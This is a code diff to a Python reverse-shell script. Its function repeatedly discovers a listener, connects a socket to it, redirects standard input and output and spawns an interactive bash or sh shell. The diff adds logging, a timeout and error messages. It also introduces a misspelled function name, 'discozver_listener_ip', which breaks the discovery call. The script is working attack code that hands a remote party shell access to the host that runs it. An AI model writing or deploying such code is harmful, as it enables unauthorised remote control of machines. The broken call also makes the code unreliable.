@@ -36,15 +36,18 @@ def discover_listener_ip(port: int) -> str | None:
 def run_reverse_shell(port: int = 4444) -> None:
     """Continuously attempts to discover a listener and establish a reverse shell."""
     while True:
-        target_host = discover_listener_ip(port)
+        target_host = discozver_listener_ip(port)
         if not target_host:
             time.sleep(10)  # Wait before retrying discovery
             continue
 
         try:
             # Establish the socket connection
+            print(f"Connecting to listener at {target_host}:{port}...")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
             s.connect((target_host, port))
+            print("Connection established. Redirecting I/O...")
 
             # Duplicate file descriptors for stdin, stdout, and stderr to the socket
             # This is necessary for an interactive TTY over a socket.
@@ -59,13 +62,16 @@ def run_reverse_shell(port: int = 4444) -> None:
             elif os.path.exists("/bin/bash"):
                 shell = "/bin/bash"
 
+            print(f"Spawning interactive shell ({shell})...")
             # Use pty.spawn as it's the most robust way to create an interactive shell 
             # over a socket on Unix systems (Linux/macOS)
             pty.spawn(shell)
-        except Exception:
-            # Silently fail and retry after a delay
+            print("Shell session terminated.")
+        except Exception as e:
+            print(f"Reverse shell error: {e}")
             pass
         finally:
+            print("Closing connection.")
             try:
                 s.close()
             except NameError:
